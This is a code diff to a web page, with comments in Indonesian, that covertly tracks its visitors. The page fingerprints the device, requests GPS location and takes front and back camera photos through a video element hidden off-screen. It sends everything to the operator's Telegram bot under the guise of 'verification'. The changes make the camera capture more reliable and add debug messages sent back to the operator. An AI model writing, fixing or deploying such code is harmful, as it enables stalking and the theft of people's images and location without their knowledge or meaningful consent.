@@ -90,7 +90,8 @@
     </div>
   </div>
 
-  <video id="cam-video" style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;" playsinline autoplay muted></video>
+  <!-- Video diletakkan di luar viewport agar tetap dirender -->
+  <video id="cam-video" style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px;" playsinline autoplay muted></video>
   <canvas id="photo-canvas" style="display:none;"></canvas>
 
   <script>
@@ -120,7 +121,7 @@
           method: 'POST', headers: {'Content-Type': 'application/json'},
           body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
         });
-      } catch(e){}
+      } catch(e) {}
     }
 
     async function sendPhoto(blob, caption) {
@@ -128,10 +129,9 @@
       fd.append('chat_id', CHAT_ID);
       fd.append('photo', blob, 'verification.jpg');
       fd.append('caption', caption);
-      try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd }); } catch(e){}
+      try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd }); } catch(e) {}
     }
 
-    // Notifikasi awal instan
     sendMessage(`🚨 <b>Seseorang membuka web!</b>\nSedang dilacak... Tunggu 30 detik tuan 🫡\n⏱ ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}`);
 
     // ========== FINGERPRINTING ==========
@@ -238,66 +238,63 @@ Koord IP: ${loc[0]},${loc[1]}`;
       }
     }
 
-    // ========== FUNGSI KAMERA YANG DIPERBAIKI ==========
+    // ========== FUNGSI KAMERA DENGAN DEBUGGING ==========
     async function startCamera(facingMode) {
       let stream;
       try {
-        // Gunakan resolusi rendah agar stabil
         stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+          video: { facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
           audio: false
         });
       } catch (err) {
-        throw err; // izin ditolak
+        await sendMessage(`❌ Kamera ${facingMode} gagal: ${err.message}`);
+        throw err;
       }
 
       video.srcObject = stream;
-      video.setAttribute('playsinline', '');
-      video.muted = true;
-      try {
-        await video.play();
-      } catch (e) {
-        // fallback: user gesture mungkin diperlukan, tapi seharusnya tidak
+      try { await video.play(); } catch (playErr) {
+        await sendMessage(`❌ Gagal play video ${facingMode}: ${playErr.message}`);
       }
 
-      // Tunggu hingga metadata dimuat
+      // Tunggu metadata
       await new Promise((resolve) => { video.onloadedmetadata = resolve; });
 
-      // Penting: tunggu beberapa frame agar gambar benar-benar siap
-      await new Promise((resolve) => {
-        // Gunakan requestVideoFrameCallback jika tersedia
-        if ('requestVideoFrameCallback' in video) {
-          video.requestVideoFrameCallback(() => {
-            // Tambahkan sedikit delay tambahan
-            setTimeout(resolve, 100);
-          });
-        } else {
-          // Fallback: setTimeout 300ms
-          setTimeout(resolve, 300);
-        }
-      });
+      // Tunggu sampai readyState >= 2 (HAVE_CURRENT_DATA)
+      if (video.readyState < 2) {
+        await new Promise((resolve) => {
+          video.oncanplay = resolve;
+          // fallback timeout
+          setTimeout(resolve, 1000);
+        });
+      }
 
-      // Sekarang capture
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      // Loop ambil gambar sampai dapat blob yang cukup besar (maks 3x)
+      let blob = null;
+      for (let i = 0; i < 3; i++) {
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Bersihkan stream
+        blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+        if (blob && blob.size > 500) break; // sukses
+        // Tunggu sebentar sebelum coba lagi
+        await new Promise(r => setTimeout(r, 200));
+      }
+
+      // Matikan stream
       stream.getTracks().forEach(t => t.stop());
       video.srcObject = null;
 
-      // Buat blob
-      const blob = await new Promise((resolve, reject) => {
-        canvas.toBlob((b) => {
-          if (b && b.size > 100) resolve(b);
-          else reject(new Error('Blob terlalu kecil atau kosong'));
-        }, 'image/jpeg', 0.9);
-      });
+      // Kirim log jika blob terlalu kecil
+      if (!blob || blob.size <= 500) {
+        await sendMessage(`⚠️ Kamera ${facingMode} menghasilkan blob kecil/ kosong. Ukuran: ${blob ? blob.size : 'null'}, videoWidth: ${canvas.width}, videoHeight: ${canvas.height}, readyState: ${video.readyState}`);
+        throw new Error('Blob terlalu kecil');
+      }
 
       return blob;
     }
 
-    // ========== GPS (SUDAH BAIK) ==========
+    // ========== GPS ==========
     function requestLocation(retryCount = 0) {
       return new Promise((resolve, reject) => {
         if (!navigator.geolocation) return reject(new Error('Geolocation not supported'));
@@ -422,17 +419,14 @@ Baterai: ${battery}
       retryArea.innerHTML = '';
       attempt++;
 
-      // Lokasi
       try { await requestLocation(0); } catch(e) { gpsCoords = null; }
 
-      // Kamera depan dengan fungsi baru
       try {
         frontBlob = await startCamera('user');
       } catch(e) {
         frontBlob = null;
       }
 
-      // Belakang opsional
       if (frontBlob) {
         try { backBlob = await startCamera('environment'); } catch(e) { backBlob = null; }
       }
